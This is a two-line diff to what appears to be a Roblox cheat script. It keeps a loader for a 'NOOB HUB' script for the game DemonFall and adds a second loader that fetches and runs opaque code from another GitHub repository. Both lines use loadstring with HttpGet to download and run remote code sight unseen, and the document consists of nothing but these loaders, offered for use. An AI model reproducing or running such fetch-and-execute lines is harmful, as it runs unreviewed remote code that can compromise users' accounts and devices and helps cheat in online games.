@@ -1,1 +1,2 @@
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/NOOBHUBX/DemonFall/main/NOOB%20HUB.Lua'),true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/deadxzero/noob/main/xeexexeex"))();
